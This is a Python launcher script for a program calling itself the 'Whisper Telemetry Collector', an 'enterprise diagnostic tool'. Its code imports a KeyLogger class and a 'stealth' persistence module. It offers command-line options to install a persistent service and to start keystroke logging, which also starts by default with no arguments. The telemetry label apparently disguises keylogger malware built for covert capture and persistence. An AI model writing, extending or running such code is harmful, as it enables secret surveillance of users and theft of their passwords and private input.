"""
Whisper Telemetry Collector - Enterprise Edition
Authorized diagnostic tool. Unauthorized use prohibited.
"""

import argparse
import sys
import os
from pathlib import Path

# Add src to path
sys.path.insert(0, str(Path(__file__).parent))

from core.keylogger import KeyLogger
from stealth.persistence import Persistence
from utils.logger import setup_logging

def main():
    parser = argparse.ArgumentParser(description="Whisper Telemetry Collector")
    parser.add_argument("--service", choices=["install", "uninstall", "start", "stop"])
    parser.add_argument("--config", default=".env", help="Config file path")
    args = parser.parse_args()
    
    if args.service == "install":
        Persistence.install_service()
        print("[Whisper] Service installed")
    elif args.service == "uninstall":
        Persistence.uninstall_service()
        print("[Whisper] Service uninstalled")
    elif args.service == "start":
        logger = KeyLogger()
        logger.start()
    elif args.service == "stop":
        # Signal to stop
        pass
    else:
        # Interactive mode
        logger = KeyLogger()
        logger.start()

if __name__ == "__main__":
    main()
